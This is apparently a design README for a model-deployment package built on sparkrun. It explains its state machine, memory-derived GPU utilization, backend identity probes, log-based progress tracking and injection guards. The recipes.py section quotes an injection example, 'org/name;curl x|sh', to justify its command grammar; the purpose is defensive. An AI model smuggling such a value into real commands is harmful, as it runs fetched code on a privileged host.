# deploy

Turns an approved plan into a running sparkrun backend, watches it, and tears
it down. It launches nothing the fit gate refused, it renders the exact argv
before it runs it, and every phase a person sees during a twenty-minute launch
is a line one of two programs actually printed.

Four rules the package exists to enforce, and they are `manager.py`'s own list:
the fit verdict gates every launch and its refusal is carried unedited; one
node runs one copy of a model; illegal transitions raise rather than being
corrected; and memory pressure sheds load, never kills.

## Layout

| File | Lines | What it owns |
|---|---|---|
| `manager.py` | 1758 | `DeploymentManager`: the FSM, the launch worker, the health and memory watch, `reconcile()` |
| `sparkrun.py` | 721 | plan -> invocation -> parsed handle, and the log subscription |
| `progress.py` | 386 | which of the four slow steps a launch is on, from literal markers |
| `recipes.py` | 383 | the per-deployment recipe, and the three injection grammars that guard it |
| `flags.py` | 360 | the one place that knows sparkrun's CLI and the three runtime specs |
| `stub.py` | 293 | the day-0 manager: same FSM, same events, nothing launched |
| `store.py` | 214 | one atomic JSON file per deployment, plus its sparkrun handle |
| `health.py` | 178 | is the backend answering -- and is it ours |
| `events.py` | 127 | the thread-safe fan-out bus, drop-oldest for slow subscribers |
| `utilization.py` | 100 | `--gpu-memory-utilization` derived per deployment, not a constant |
| `__init__.py` | 75 | the export surface: both managers, the events, the errors |
| `fsm.py` | 71 | the transition table. Illegal transitions raise |

## `manager.py`

`DeploymentManager.launch(shape, plan, fit, runtime, ctx, max_seqs, ...)`
refuses, renders, runs, and returns the moment the deployment is `LAUNCHING` --
a 120B model takes minutes to load and readiness is settled on a worker thread.
`WONT_FIT` starts nothing: not a subprocess, not a recipe file. It emits
`launch_refused` and raises `LaunchRefused`, whose `str()` is the fit gate's
reason character for character.

Everything unsafe is checked before a record exists. `check_recipe_identifiers`
and `check_extra_args_safe` run synchronously in `launch()` and again inside
`synthesize()`, because without the first pass a malformed `model_id` produced a
`LAUNCHING` deployment that only failed when the worker thread reached
`synthesize()` several steps later -- reported as an ordinary launch failure
rather than a refusal.

`DuplicateDeployment` carries `clash="model"` or `clash="served_name"` and
explains itself in the sentence: a second copy of a model on one node shares
unified memory the gate budgeted for one, and a second deployment answering to
one served name leaves two things to stop and no way to tell which served a
reply.

`stop()` waits for confirmation, and `is_running()` being three-valued is what
makes the wait honest -- "confirmed" means an explicit `False`, never merely the
absence of a `True`. Unconfirmed after `stop_confirm_timeout_s` it escalates to
the node agents (`_kill_through_agents`, `include_local=True`, because on a
single-Spark cluster the workload is on the coordinator's own node), then lands
in `STOPPED` with a `last_error` naming the cluster id and hosts and a
`stop_escalated` event. A stop during `LAUNCHING` has no FSM edge, so it tears
the container down and lands in `FAILED` with a `last_error` saying this was a
request rather than a crash -- orphaning a workload because the diagram lacks an
arrow is worse than the labelling question.

`_launch_utilization` divides by the node's **live** total, not
`profile.total_memory`, because the live sample is what the runtime itself
divides by; the tightest node in the plan decides, since one flag covers them
all. `_check_memory` divides by `profile.addressable_memory` and says why: on
GB10 addressable (119.7 GiB) is about 7% below the 128 GiB nameplate, so the
nameplate under-reads pressure by that much and this watch and the gateway's
admission controller would trip at different real occupancy.

`_probe_backends` probes serving deployments concurrently on plain daemon
threads, up to `MAX_PROBE_WORKERS` (64) at once; past that the `_probe_offset`
cursor rotates which window gets probed each tick, and the source says out loud
that `DEATH_BOUND_S` stops being provable by construction there -- an accepted
limit rather than an unbounded thread pool. A `ThreadPoolExecutor` was rejected
outright: its shutdown defaults to `wait=True` and blocks on a genuinely stuck
worker whatever timeout a future was given, which is the exact hang the method
exists to bound. Serial probing was worse than the arithmetic suggested -- with
`MIN_PROBE_TIMEOUT_S` (0.25) flooring a per-deployment share, the *sum* across
deployments grew without bound past six watched (16s at six, 30s at twenty,
against a `DEATH_BOUND_S` of 15.0). Each
thread also gets a hard join deadline, because a probe's timeout bounds each
socket operation and not the call's wall time.

`_allocate_port` counts its own records and then *binds* each candidate through
`port_is_free` over a 200-port window, because the counter knows only what this
control plane started. Nothing free falls back to the counter's answer and logs
it rather than refusing: the check is an improvement on a guess, and the identity
probe is what actually protects the deployment.

`reconcile()` is the only place a state is set without an FSM check, once per
record, and `_evidence` chooses it. Three branches are load-bearing. A healthy
port serving a *different* model returns `FAILED` with the probe's own sentence,
because leaving it `LAUNCHING` keeps the url, the ready-waiter keeps finding the
stranger, and the next restart re-adopts it. A record with no cluster id is
`LAUNCHING`, not `FAILED`: it is the youngest record there is, and reading it as
dead reported "launch did not survive the control plane restart" about a
sparkrun process that was alive and still loading -- observed on the live box,
leaving an orphan holding GPU memory on a machine whose aggregate memory reads
N/A. And `running is None` -- sparkrun could not be asked -- adopts as
`LAUNCHING` with a reason saying so, because absence of evidence is not evidence
of death.

`handles()`, `progress()` and `log_tail()` sit deliberately off the frozen
`DeploymentPort` and the gateway reaches all three through `getattr`, so a port
without them degrades to "nothing attributable" / "no phase reported" / "no log"
rather than a 500. `progress()` reports only `LAUNCHING` records: a phase left
over from how a serving deployment got there would be a stale sentence rendered
as a live one.

`LOG_TAIL_LINES` is 300 and was 60. A real failed launch here ended
`RuntimeError: Engine core initialization failed. See root cause above.` with
the root cause -- a `ValueError` about GPU memory -- some 40 lines further back,
past the tail. A traceback that tells you to look above is worthless if the
buffer starts below it, and this is one transfer per launch rather than a poll.
`LOG_BUFFER_LINES` (500) is the other window and not the same one: it is the
per-deployment ring `log_tail()` serves from, sized to hold a whole vLLM
startup.

`_emit_fit_miss` is described in the file as the most valuable telemetry the
system produces: a launch that OOMs after passing the gate means the estimate was
low, so the whole six-term breakdown goes out beside the actual error.

## `sparkrun.py`

`SparkrunAdapter` renders, runs, inspects and tears down. `render_command()` is
pure -- no subprocess, no filesystem -- and returns the argv that will actually
run, `--no-follow` included, because the UI shows it before anybody commits.
`launch()` runs it, parses `CLUSTER_ID_RE`, `HEAD_HOST_RE` and `TARGET_HOST_RE`
back out, and raises `LaunchError` with the raw output preserved on anything
else. Exit 0 with no cluster id is still a failure: a launch we cannot address
is a launch we cannot stop.

**sparkrun's own fit estimate is ignored completely.** `sparkrun run` prints a
"VRAM Estimation" block ending in "DGX Spark fit: YES". It is advisory, it does
not block, its utilization figures are known to be wrong, and this module never
parses it. The `FitResult` is the only verdict that gates a launch.

`check_job()` and `is_running()` are three-valued on purpose: `None` when
sparkrun could not be asked -- not installed, not on PATH, or `check-job` timed
out on a wedged host. Reporting a hard `False` through either branch retired live
deployments, because the control plane's own environment can lack the binary
while a deployment it launched earlier under a different environment is still
running.

`stream_logs()` is a subscription, not a request. `sparkrun logs` runs
`docker exec <container> tail -f --lines N /tmp/sparkrun_serve.log`, because a
solo launch execs the serve command inside a sleeping container and its output
never reaches `docker logs`. `LogStream` pumps it on its own thread -- reading
the pipe from the thread waiting for readiness would make the readiness wait as
slow as a log follower that never ends -- and `close()` kills the whole process
group, since killing only the parent leaves the exec session open on the node.
Universal newlines is what turns the shard loader's redrawn bar into one line per
frame instead of one line at the very end.

`OOM_SIGNATURES` includes `"is less than desired gpu memory utilization"`, read
off a real failed launch on a GB10. That is a memory refusal that never says
"out of memory", and without the signature the launch was tagged an ordinary
failure and the fit gate learned nothing from the one case it is calibrated by.

## `progress.py`

`from_launcher()` and `from_runtime_log()` classify text into
`PHASES = ("preparing", "downloading", "loading", "starting", "serving")` and
return a `LaunchProgress` whose `status` is the program's own line, passed
through. `advance()` folds a reading into the current one, forwards only.

**Nothing here invents a number or a sentence.** An unrecognised line changes
*nothing* -- the phase stands and the previous sentence stands -- because the
newest line is not necessarily the current activity, and treating it as such puts
a stack-trace fragment or a tokenizer warning on screen captioned as progress.
`advance()` also refuses to walk the phase backwards: a log tail is a window, not
a stream, and a slow poll can return an older marker than the one before it.
Within a phase the newest sentence always wins, so "5/11" replaces "3/11". A
`fatal` reading is the one thing the ladder never holds back -- it does not say
where the launch has got to, it says the launch is over -- and `from_runtime_log`
scans every line for a death before it classifies anything, so a shard count
printed after the traceback does not undo it.

**The only `fraction` that exists comes from a program counting itself.**
`_SHARDS_RE` reads the checkpoint loader's own `5/11`; `_FETCHING_RE` reads
huggingface_hub's `Fetching 16 files: 19%`. `eta_s` is tqdm's own remaining
field, never computed here. There is no fraction and no ETA for the image pull,
the compile or the graph capture, because none of them reports a total, and a bar
filling at a rate this file made up gets planned around.

`_RUNTIME_FATAL` is read *before* any progress marker and is deliberately five
literals long. Four are vLLM's -- two from `run_engine_core`'s except block, the
`RuntimeError` the API server raises when the core is gone, and the frame
`File "/usr/local/bin/vllm"`, which is what a config error that no handler caught
prints on its way out (that is the marker that catches a `max_model_len` past the
model's `max_position_embeddings`, rejected inside `create_engine_config` before
`EngineCore` ever forked). The fifth is a verbatim copy of
`runtimes.tts.FATAL_MARKER`, a copy rather than an import because nothing outside
a model container may import that module, and `tests/unit/test_tts_runtime.py` asserts
the two strings match. "Looks like an error" is not the bar; "this line means the
process is on its way out" is.

The marker tables come from two sources that disagree: sparkrun's own format
strings (`Pulling image:`, `Ensuring model ... locally`) and the step headers a
real `sparkrun run --dry-run --no-follow` prints on a non-tty (`[2/6] Building
image`, `[5/6] Launching vllm runtime`). Neither set contains the other, and
matching only the first reported `preparing` through a whole launch. SGLang's
markers are absent rather than guessed, because that image is not on the box this
was written on.

## `recipes.py`

`synthesize()` builds one recipe per deployment and touches no filesystem;
`materialize()` writes it, idempotently, to
`<served-name slug>-<runtime>-<sha256[:8]>.yaml` -- the digest is of the content
itself, so identical inputs land on identical bytes at an identical path.

The reason it exists at all: **a recipe's `command` template decides which
overrides actually reach the runtime.** A stock registry recipe templates
whatever its author cared about, usually tensor parallel and nothing else, so
`--pp 2` against one is accepted, exits zero, and runs PP=1. The planner's PP
decision is the whole product and must not be dropped in silence.

Three grammars guard what reaches the file and the shell.
`_check_yaml_safe` protects the document; `_COMMAND_SAFE` protects the command,
and is stricter for a different reason -- sparkrun injects the recipe's `model:`
into the substitution namespace, substitutes it into `{model}`, and runs the
rendered string under `bash -c` in a privileged host-networked container, so
`org/name;curl x|sh` has no newline, no control character and a harmless leading
letter and would simply execute. The grammar admits every real HuggingFace id
including a quant tag and a local path, and nothing a shell reads as syntax;
`_COMMAND_BARE_REJECTS` refuses `~`, `.` and `..` outright. `_EXTRA_ARG_SAFE`
covers operator-supplied CLI tokens. `extra_args` and `custom_command` are
mutually exclusive and raise if both are sent -- one appends to the generated
serve command, the other replaces it, and a request cannot mean both.

`_custom_serve_command` appends `--host`, `--port` and `--served-model-name`
**last**, so they win however each runtime's argparse table resolves a repeated
flag, and `{model}` stays the fit gate's own resolved id so a custom launch
cannot start a different model than the one the verdict card judged.

**`cache_env` -> the `env:` block is the only channel there is.** sparkrun's
recipe format has no `volumes:` key, so anything a runtime must keep between
launches is pointed at `RUNTIME_CACHE_DIR` through an environment variable, and
that block is deliberately not run through the safety checks above because its
values are module constants from `flags.py` that never touch a request.

## `flags.py`

The one place that knows sparkrun's command line, verified against
`SPARKRUN_VERIFIED_VERSION = "0.2.40"` by running `sparkrun run ... --dry-run`
and reading `sparkrun/cli/_common.py`. When sparkrun's flags change, this is the
only edit.

**0.3.8 has also been checked end to end, and the constant is deliberately not
bumped** -- it names what the box runs, and bumping it ahead of the box would
make `test_we_can_still_talk_to_the_sparkrun_we_verified_against` skip instead
of gate. What was checked, so the next person does not redo it: every flag in
`KNOBS` is still in `cli/_common.py`; every key a synthesized recipe writes is
still in `core/recipe.py::_KNOWN_KEYS`; `cluster check-job --json` is
byte-identical on both versions; the `[N/6] Label` step headers
`progress.py` matches are unchanged. Two things did move, and both are fixed
here rather than worked around: the cluster handle gained a second hex segment
(`CLUSTER_ID_RE`, which lost a live workload over it), and 0.3.8 warns that the
recipe's `VLLM_CACHE_ROOT` overrides a runtime-cache mount it now manages
itself -- a warning, not a failure, and `runtime_cache:` is the key it suggests
if this is ever moved.

The reason to care about 0.3.7+ at all is `SPARKRUN_DATA_PARALLEL_VERSION`: it
is the first release that can launch a pure data-parallel cluster, which is the
shape cross-node expert parallel takes. See `data_parallel_refusal`.

`KNOBS` is the table, and its order is the order in the rendered command. Every
`Knob` carries a `recipe_key` even when it has a `cli_flag`, because a CLI
override still has to land on a `{recipe_key}` the synthesized template
references or the value is dropped. sparkrun has no `--max-num-seqs` flag of its
own -- the one in this file is the *runtime's*, inside a command template -- so
concurrency rides the generic `-o key=value` channel instead, and `Knob.emit`
takes a `recipe_key` argument because the key is runtime-specific
(`max_num_seqs` for vLLM, `max_running_requests` for SGLang). Three knobs go
that way and the table says so: `max_concurrent_seqs`, `expert_parallel` and
`data_parallel`.

`gpu_memory_utilization` is the knob to read twice. sparkrun spells it
`--gpu-mem` and `_pct` renders it to two decimals; the recipe key it sets, and
the flag the runtime finally sees, are `gpu_memory_utilization` and
`--gpu-memory-utilization`. Grepping this file for the runtime's spelling finds
a command template, not the knob. `SUPPORTED_RUNTIMES` is `tuple(RUNTIMES)`,
and `contracts/derived.py` names it canonical, so a fourth runtime is one entry
in `RUNTIMES` and nowhere else.

`RUNTIMES` holds three `RuntimeSpec`s, and `recipes.container_image(spec)` is
how one becomes an image: each spec names its own override variable in
`default_image_env` (`DERATE_VLLM_IMAGE`, `DERATE_SGLANG_IMAGE`,
`DERATE_TTS_IMAGE`), consulted before `default_image`. vLLM defaults to
`ghcr.io/pizzaman213/derate/vllm-audio:latest`, one pip layer over the upstream
image, because the upstream image cannot decode an audio file and a Whisper
deployment launched from it reaches READY, passes the identity check, and refuses
every upload. `VLLM_CACHE_ROOT` is pointed into `RUNTIME_CACHE_DIR` because vLLM
resolves it under `HOME=/tmp` in a `--rm` container, so every launch of every
model recompiled from cold. SGLang gets `TORCHINDUCTOR_CACHE_DIR` and
`TRITON_CACHE_DIR` -- PyTorch's own names, verified 2026-09-10 against
`scitrera/dgx-spark-sglang:0.5.12` by launching for real and reading the host
side of the bind mount: `TRITON_CACHE_DIR` holds real compiled kernels that
survive the container, and `TORCHINDUCTOR_CACHE_DIR` stays empty because this
recipe never passes `--enable-torch-compile`, so Inductor is never invoked at
all. `tts` sets `sparkrun_runtime="vllm"` on
purpose: sparkrun's runtime field selects an *orchestration* plugin, every plugin
renders the recipe's explicit `command:` verbatim, and there is no plugin for a
runtime sparkrun has never heard of. Its `cache_env` is the voice library, not a
compile cache, and `shards=False`.

`sharding_refusal()` answers before a launch what a single-process runtime would
otherwise discover during one. It refuses on any of four degrees above 1 --
tensor, pipeline, expert and data parallel -- because none of them can reach
that runtime's command template at all, so the decision would evaporate between
the plan on screen and the process on the machine. A `tts` deployment handed
TP=2 passes the fit gate
-- the arithmetic is per-rank and a sharded model fits more easily, not less --
commits two machines, starts one server, and sits in `LAUNCHING` until the health
timeout with nothing on screen naming the cause.

## `stub.py`

`StubDeploymentManager` fakes the lifecycle with timers: `LAUNCHING` for
`LAUNCH_SECONDS` (3.0), then `READY` with a fake backend url. It is a stub in
exactly one respect -- nothing is launched. The FSM is the same, the refusal on
`WONT_FIT` carries the same reason verbatim, the event names and payloads are the
same on the same bus, and it imports `_Record` and `LaunchRefused` from
`manager.py` rather than reimplementing them. A stub that returns a shape the
real thing does not is worse than no stub.

`simulate_memory`, `simulate_node_unhealthy` and `simulate_backend_death` are the
test hooks: they drive the same `node_severity` bookkeeping and emit the same
`memory_critical` / `node_unhealthy` / `backend_lost` events the real watch
would, so admission control and failover can be exercised before there is a
cluster to exercise them on.

## `store.py`

One JSON file per deployment under `<state_dir>/deployments/`, written through
`_atomic_write` -- `mkstemp`, `fsync`, `os.replace` -- so a half-written file can
never be read back as a deployment. `_path()` filters the deployment id down to
alphanumerics, `-` and `_` and raises `ValueError` when nothing survives, so an
id is a filename and never a path. Records carry the full `ModelShape`,
`ParallelismPlan` and `FitResult`, because `reconcile()` has to hand the gateway
a complete `Deployment` without re-running the resolver, the planner or the fit
gate against a cluster that may have changed shape while the control plane was
down.

The codec is hand-written rather than a dataclass walker: the contracts are
frozen, so the shape is known, and an explicit codec fails loudly when a contract
changes instead of silently dropping a field. `SCHEMA_VERSION` is 2 and
`decode()` defaults `modality` to `TEXT`, so a v1 record still loads -- a record
written before the field existed was necessarily a text deployment, which makes
the default also the truth.

`purge_expired()` deletes `FAILED`/`STOPPED` records untouched for
`TERMINAL_RETENTION_S` (7 days), keyed on mtime because `save()` rewrites the
file on every state change. `delete()` had no caller, so terminal records
accumulated forever and were reloaded into memory on every restart.
`load_all()` skips an unreadable file with a warning: one bad record must not
stop the control plane adopting the deployments that are still running.

## `health.py`

`probe(backend_url, *, timeout=3.0, expect_model=None)` returns
`(healthy, reason_when_not)`. `HEALTH_PATHS` is `("/health", "/v1/models")` --
both runtimes serve health at the origin, not under `/v1`. urllib rather than
httpx so the probe has no dependency of its own and runs from a watchdog thread
with no event loop.

**Answering is not the same as being ours.** A 200 says a server is there, not
that it is the server we started. `_allocate_port` hands ports out from a counter
and cannot see what a machine is already running, so a runtime somebody else left
on 8100 was adopted as a healthy deployment: the floor drew it ready, routing sent
it traffic, and a request for `Qwen2.5-0.5B-Instruct` came back from a llama.cpp
build serving `ling-3.0-flash`. Nothing could notice, because nothing had asked
the port what it was serving. With `expect_model`, `/v1/models` is consulted
**first** and a mismatch is unhealthy -- falling through to `/health` afterwards
would restore the bug, since a mismatched server answers `/health` perfectly
well.

`_models` reads at most `_MAX_BODY` (256 KiB) rather than to EOF, because this
runs on a watchdog thread against a port that may belong to anything at all and
an unbounded read from a stranger is a hang. `_names` reads three shapes out of
what comes back (`data[].id`, vLLM's `data[].root`, and the top-level `models[]`
Ollama and llama-server emit) and `serves()` is the comparison. `_tail` matches
on the last path segment, so a runtime reporting the repository it loaded is agreeing with
us rather than contradicting us. A port that answers but names nothing readable
falls back to liveness: that is the pre-existing situation, and refusing it would
kill deployments behind proxies that never spoke this dialect. `wrong_model()`
and `_MISMATCH_MARK` keep the distinction greppable in one place -- a dead port
is a deployment to restart, a stranger's port is a deployment whose url is a lie,
and restarting that one just re-adopts the stranger.

## `events.py`

`EventBus` fans out to any number of async subscribers. `subscribe()` is an
async generator yielding from a private `asyncio.Queue` capped at `_QUEUE_MAX`
(512) -- cancel the consuming task to unsubscribe -- and `recent()` replays the
last `_HISTORY` (256) events for a UI that connected after the fact. Producers
are background threads and consumers are asyncio tasks, so `emit()` is
thread-safe and never blocks the producer: `_offer` drops a full queue's
*oldest* event rather than stalling the health watch. The eleven type names --
`STATE_CHANGED`, `MEMORY_CRITICAL`, `FIT_MISS`, `STOP_ESCALATED` and the rest --
are constants
because consumers code against them, not against string literals.

`add_tap()` exists because a subscriber is the right shape for a UI, which can
miss an event and redraw, and the wrong shape for a durable record: the queue
drops its oldest under burst, and the burst is exactly when the events matter. A
tap runs synchronously on the producer's thread and cannot be outrun; the
contract is that it must be non-blocking, and one that raises is logged and
ignored, because recording an event must never break delivering it.

`MEMORY_WARN_FRACTION` is 0.90 and `MEMORY_CRITICAL_FRACTION` is 0.95. Critical
means the gateway stops admitting. Nothing here kills: shedding load is
recoverable, killing a loaded 120B model is not.

## `utilization.py`

`utilization_for(*, needed_bytes, device_total_bytes, free_bytes=None, ceiling)`
derives `--gpu-memory-utilization` per deployment from the fit gate's own
per-node total. **The flag is a claim on the whole device, not a limit**: vLLM
refuses to start unless that share is free *right now*, then fills it with KV
cache, so a constant 0.90 asks for ninety percent of the machine identically for
a 0.5B model and a 120B one.

Three launches in a row died thirty seconds in on the box this was written on:

```
ValueError: Free memory on device cuda:0 (34.26/120.56 GiB) on startup is
less than desired GPU memory utilization (0.9, 108.51 GiB).
```

One of them was `Qwen2-0.5B-Instruct-int4`, which the fit gate had passed
correctly against the live budget -- **1.8 GiB predicted into 24.0 GiB usable,
basis "live"** -- and then the launch asked for 108.5 GiB, because the flag had
nothing to do with any of that. The node was holding 84 GiB in ordinary
neighbours.

Three bounds, in the order they bind: what the plan needs times `REQUEST_MARGIN`
(1.05, deliberately slight -- erring low costs KV cache, erring high costs the
whole launch); what is free times `FREE_HEADROOM` (0.92, covering the moment
between reading the number and the runtime checking it), with unknown free memory
degrading to no cap at all; and `DEFAULT_GUARDRAIL` as the ceiling it always was.
`MIN_UTILIZATION` (0.05) is applied last and deliberately wins over the free cap
on a machine with less free memory than that: nothing can start there anyway, and
the runtime's own refusal names the actual problem where a smaller ask would fail
later and less legibly inside the KV cache allocator.

## `__init__.py`

The import path, and the reason `control_plane.deploy` is imported lazily
everywhere. `from control_plane.deploy import DeploymentManager,
StubDeploymentManager` -- both satisfy `DeploymentPort` plus `reconcile()`,
`render_command()` and `events()`, so swapping one for the other changes nothing
downstream. `__all__` is 32 names and nothing downstream reaches into a submodule for any
of them: the eleven event constants plus `MEMORY_WARN_FRACTION` and
`MEMORY_CRITICAL_FRACTION`; `LEGAL`, `SERVING` and `TERMINAL`; the five
exceptions (`IllegalTransition`, `LaunchError`, `LaunchRefused`,
`DuplicateDeployment`, `SparkrunNotInstalled`); the types a caller constructs or
annotates against (`SparkrunAdapter`, `DeploymentStore`, `EventBus`,
`RecipeSpec`, `LaunchResult`); and four functions -- `probe`, `synthesize`,
`backend_origin`, `default_served_name`.

## `fsm.py`

The transition table, and the whole of the lifecycle:

```
PLANNED -> LAUNCHING -> READY -> DEGRADED -> READY
                     \         \          \
                      -> FAILED -> FAILED  -> STOPPING -> STOPPED
READY   -> STOPPING -> STOPPED
```

`check(deployment_id, source, target)` raises `IllegalTransition` unless the edge
exists, and the exception names every legal target from where it stands. A
self-transition is a no-op. Illegal transitions are bugs, not conditions: a
manager that "corrects" one hides the bug and ships a deployment record that lies
about what is running.

`DEGRADED -> FAILED` is an adopted deviation from the original diagram, which
drew only `DEGRADED -> READY` and `DEGRADED -> STOPPING`. Forcing a `STOPPING`
detour before a degraded deployment that died outright reached `FAILED` would
misrecord a crash as an operator-requested stop.

`TERMINAL` is `{FAILED, STOPPED}`, `SERVING` is `{READY, DEGRADED}`, and
`PERSISTED` is everything past `PLANNED` -- a `PLANNED` deployment launched
nothing, so there is nothing on disk worth reconciling against.

## The seam with the gateway, node.py and telemetry

`control_plane/gateway/states.py` spells `TERMINAL` and `SERVING` a second time
rather than importing `deploy.fsm`, because `from control_plane.deploy import
fsm` runs the package `__init__` and pulls the manager, the sparkrun adapter and
the event bus into a request-handling module to obtain one frozenset.
`control_plane/contracts/derived.py` names
`control_plane.deploy.fsm:TERMINAL`, `control_plane.deploy.fsm:SERVING` and
`control_plane.deploy.flags:SUPPORTED_RUNTIMES` as canonical, and
`tests/unit/test_single_source.py` fails when the copy stops matching.

- **`control_plane/node.py`** is the composition root and imports lazily inside
  `build_gateway_deps`, so a worker process never pulls the package in. It builds
  the one real `DeploymentManager` and also takes `flags.RUNTIMES` and
  `recipes.container_image`, because the composition root is the only thing that
  knows which images this build launches.
- **`control_plane/gateway/internal_api.py`** imports
  `deploy.flags.sharding_refusal` inside the function that needs it, for the same
  package-`__init__` reason, and reaches `handles`, `log_tail` and `progress`
  off the manager through three separate `getattr` calls.
- **`control_plane/gateway/app.py`** calls `deployments.reconcile` as an optional
  startup step, and `_consume_deployment_events` subscribes to the bus.
- **`control_plane/gateway/restart.py`** is a *second* independent consumer on
  the same fan-out, watching `STATE_CHANGED` for a crash and relaunching. It is
  deliberately entirely in the gateway layer and never touches `manager.py`.
- **`control_plane/telemetry/`** taps rather than subscribes, so a burst cannot
  lose the events worth keeping. `events.py` defines `journal_events` and
  `SOURCE_DEPLOY`, imports `EventBus` under `TYPE_CHECKING` and constructs one
  through a deferred `_new_bus()`; `service.py` is what actually attaches it,
  `journal_events(bus, self.sink, SOURCE_DEPLOY)`.

```python
from control_plane.deploy import DeploymentManager, LaunchRefused

manager = DeploymentManager(adapter, registry, state_dir=data_dir())
manager.reconcile()                       # adopt what is still running
try:
    deployment = manager.launch(shape, plan, fit, "vllm", ctx, max_seqs)
except LaunchRefused as exc:
    refuse(exc.reason)                    # the fit gate's words, verbatim
```

## Things that look like details and are not

**A dead engine does not kill its container.** A solo launch execs the serve
command inside a container that sleeps forever, so `sparkrun cluster check-job`
still says "running" after the engine has exited: the port never answers and the
launch waits out the whole `READY_TIMEOUT_S` of 1800s. On this box that was a
launch that died after thirty seconds and was watched for thirty minutes, with
the reason -- vLLM refusing to start because 49.56 of 121.69 GiB were free
against a 0.9 target -- sitting in a log file nothing read. `_RUNTIME_FATAL` is
what catches it, and `_wait_for_ready` checks `record.progress.fatal` on every
pass. This is also why `READY_CHECK_JOB_EVERY` is 5 rather than 1: the container
check costs a subprocess and an off-host SSH round trip, some six hundred of them
across a long launch, to catch a case the runtime's own words already cover every
pass. What is left for it is the rarer one, the container itself going away. The
first pass always checks, so a launch into a container that is already gone still
fails at once.

**The four slow things are not slow in the order you would guess.** Measured on
a 0.5B launch with image and weights already local: CUDA graph capture 40s+,
python/vLLM import twice (APIServer, then the EngineCore fork) ~26s, sparkrun prep
and `docker run` ~19s, cold `torch.compile` 7.5s, and weight load **5.6s**. The
shard-counting progress bar -- the only real fraction in the whole launch --
covers the cheapest step. That is why `Loading weights took` is classified as
`starting` rather than `loading`: it announces that loading *finished*, and the
engine work after it was the least visible part of the launch.

**`--no-follow` is in the rendered command, and the 5s liveness check is why it
is survivable.** sparkrun detaches instead of streaming container logs forever,
but still does a 5s liveness check before exiting, which is how a container that
dies on startup surfaces as a non-zero return code.

**Expert and data parallel are sent only when above 1.** sparkrun hashes
non-default parallelism into the `cluster_id`, so an explicit `1` would change
the handle -- the thing every stop, log read and liveness check is addressed
by -- for no reason.

**`gpu_memory_utilization` is read from the argument, not from `self`.**
`render_command` uses the same value the recipe was synthesized with, because the
knob is emitted as a CLI override that wins over the recipe default; reading
`self.gpu_memory_utilization` there would put one number on screen and run
another. The flag itself is spelled in `flags.py` and nowhere else, and there is a
test.

**The recipe path is a hash of the recipe's content.** `synthesize()` is pure and
deterministic, so identical inputs give identical bytes at an identical path.
That is what makes `render_command()` safe to show a person before they commit to
the launch it describes.

**`RUNTIME_CACHE_DIR` is beside `hub/`, never inside it.**
`registry/modelcache.py` measures and deletes by walking `hub/models--*`, so a
compile cache or a reference voice clip placed inside would be billed as model
weights on the storage screen.

## Failure behaviour

- **sparkrun is not installed.** `adapter.require()` raises
  `SparkrunNotInstalled` before anything is created, with the install line and
  the `DERATE_SPARKRUN_BIN` override in the message. `check_job` returns
  `{"running": None}` rather than a false negative.
- **The fit gate says `WONT_FIT`.** Nothing starts. `launch_refused` is emitted
  and `LaunchRefused` carries the reason unedited.
- **The runtime OOMs after passing the gate.** `is_oom()` tags it, a `fit_miss`
  event carries the whole predicted breakdown beside the actual error, and the
  manager logs the predicted-vs-usable byte counts at `error`.
- **`sparkrun stop` does not confirm.** Escalate to the node agents, then land in
  `STOPPED` regardless -- with `last_error` naming the cluster id, the hosts and
  the `sparkrun cluster check-job` command to run, and a `stop_escalated` event.
  A stop that killed rather than exited gracefully still says so, because that is
  where a half-written cache comes from.
- **A node is missing from the registry during the watch.** Skipped, not flapped
  on: a node not yet enrolled must not degrade a healthy deployment at startup.
- **A backend probe hangs.** The per-path timeout is derived every tick from
  `DEATH_BOUND_S`, floored at `MIN_PROBE_TIMEOUT_S`, and each probe thread has a
  hard join deadline. A thread still stuck is a daemon and cannot block process
  exit.
- **A deployment record is corrupt.** `load_all()` logs and skips it;
  `purge_expired()` leaves anything it cannot evaluate alone rather than guessing.
- **The container log cannot be followed.** `LOG_STREAM_ATTEMPTS` (5) retries at
  `LOG_STREAM_RETRY_S` (6.0) and then stops. The launch loses a caption, not a
  subprocess started every few seconds for half an hour.
- **No node has a live memory reading.** `_launch_utilization` returns `None` and
  the adapter's own default stands. Never a refusal for want of a live number.
- **No free port in the 200-port window.** Warn and hand out the counter's
  answer. The identity probe is what protects the deployment.

## Deliberately not built

**A cancel for a launch in flight.** The lifecycle has no `LAUNCHING ->
STOPPING` edge and none was added. `stop()` during a launch tears the container
down and lands in `FAILED` with a `last_error` saying it was requested, because
the labelling question is smaller than the orphaned workload.

**A kill on memory pressure.** `MEMORY_CRITICAL_FRACTION` tells the gateway to
stop admitting and nothing more. Shedding load is recoverable; killing a loaded
120B model is twenty minutes of reload. The one place this package signals a
process is `_kill_through_agents`, reached only from an explicit operator stop.

**A parser for sparkrun's VRAM estimation block.** It is advisory, it does not
block, and its utilization figures are known to be wrong. `sparkrun.py` never
reads it.

**SGLang launch markers.** They are absent rather than guessed, because that
container is not on the box `progress.py` was written against. The cost is one
phase caption -- the manager still seeds `loading` when the container comes up --
and the alternative was reporting something untrue.
